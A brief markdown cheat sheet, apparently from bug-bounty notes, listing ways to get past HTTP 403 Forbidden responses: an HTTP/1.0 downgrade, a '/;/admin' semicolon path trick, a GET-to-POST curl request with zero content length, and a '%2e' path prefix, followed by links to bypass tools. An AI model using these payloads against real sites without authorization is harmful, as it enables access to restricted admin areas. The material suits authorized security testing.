# 403 Forbidden Bypasses

- HTTP protocol version downgrade
- Semicolon bypass (;)
- Modify the request method and content length
- Append characters

---
### HTTP Protocol Version Downgrade

Method:
  - Capture the request in BurpSuite - Send to Repeater
  - Change the http protocol version from **1.1** to **1.0** and clear all the other headers from the request
  - Forward the request to the Server
  - Reference: [Link](https://medium.com/@abbasheybati1/403-bypass-lyncdiscover-microsoft-com-db2778458c33)
---
### Semicolon Bypass (;)

Method:
Blocked (403 Forbidden):
```CSS
https://www.hackme.in/admin
```
Bypassed (200 OK):
```CSS
https://www.hackme.in/;/admin
https://www.hackme.in/;/admin/config/listConfiguration
```
---
### Modify the Request Method and Content Length

Method:
  - GET => POST
	- Content-Length: 0
```
curl -X POST https://domain.com/admin -H "Content-Length: 0"
```
---
### Append Characters

Method:
  - Append `%2e` before the directory/ file name

Blocked (403 Forbidden):
```
https://domain.com/admin
```
Bypassed (200 OK):
```
https://domain.com/%2e/admin
```
---




#### Tools:
- https://github.com/lobuhi/byp4xx
- https://github.com/iamj0ker/bypass-403
- https://github.com/gotr00t0day/forbiddenpass
- https://github.com/yunemse48/403bypasser
- https://github.com/Dheerajmadhukar/4-ZERO-3

#### References:
- https://kathan19.gitbook.io/howtohunt/status-code-bypass/403bypass
